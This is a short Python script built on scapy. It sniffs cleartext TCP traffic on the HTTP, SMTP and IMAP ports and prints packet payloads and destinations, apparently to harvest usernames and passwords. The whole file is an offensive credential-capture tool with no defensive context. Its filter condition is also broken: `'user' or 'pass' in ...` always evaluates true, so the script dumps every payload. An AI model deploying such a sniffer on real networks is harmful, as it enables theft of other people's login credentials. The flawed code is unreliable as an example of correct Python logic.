from scapy.all import sniff, TCP, IP
 
def packet_callback(packet):
    if packet[TCP].payload:
        myPacket= str(packet[TCP].payload)
        if 'user' or 'pass' in myPacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # fire the sniffer
    sniff(filter='tcp port 80 or tcp port 25 or tcp port 143', prn= packet_callback, store=0)
    
if __name__ =='__main__':
    main()